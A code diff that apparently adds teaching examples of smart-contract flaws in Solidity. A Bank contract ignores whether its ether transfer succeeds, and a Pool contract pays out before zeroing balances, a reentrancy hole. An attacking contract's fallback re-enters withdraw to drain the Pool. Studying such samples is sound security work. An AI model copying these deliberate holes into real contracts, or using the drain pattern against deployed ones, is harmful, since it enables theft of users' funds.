@@ -138,3 +138,103 @@ contract Attack {
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Bank {
+
+    mapping(address => uint256)
+        public balances;
+
+    function deposit()
+        external
+        payable
+    {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint256 amount)
+        external
+    {
+        require(
+            balances[msg.sender] >= amount,
+            "LOW BALANCE"
+        );
+
+        balances[msg.sender] -= amount;
+
+        msg.sender.call{value: amount}("");
+    }
+}
+
+contract Attacker {
+    Bank public bank; 
+
+    function deposit() external payable{
+        bank.deposit{value:msg.value}();
+    }
+
+    function attack() external {
+        bank.withdraw(bank.balances(address(this)));
+    }
+
+    receive() external payable {
+        revert();
+    }
+
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Pool {
+
+    mapping(address => uint256)
+        public balances;
+
+    function deposit()
+        external
+        payable
+    {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+
+        uint256 bal =
+            balances[msg.sender];
+
+        require(bal > 0);
+
+        (bool ok,) =
+            msg.sender.call{
+                value: bal
+            }("");
+
+        require(ok);
+
+        balances[msg.sender] = 0;
+    }
+}
+
+contract Attack {
+
+Pool public pool ;
+
+function deposit () external payable {
+    pool.deposit{value:msg.value}();
+}
+
+function attack() external {
+pool.withdraw();
+}
+
+fallback() external payable {
+if(address(pool).balance > 0 ){
+    pool.withdraw();
+}
+}
+}
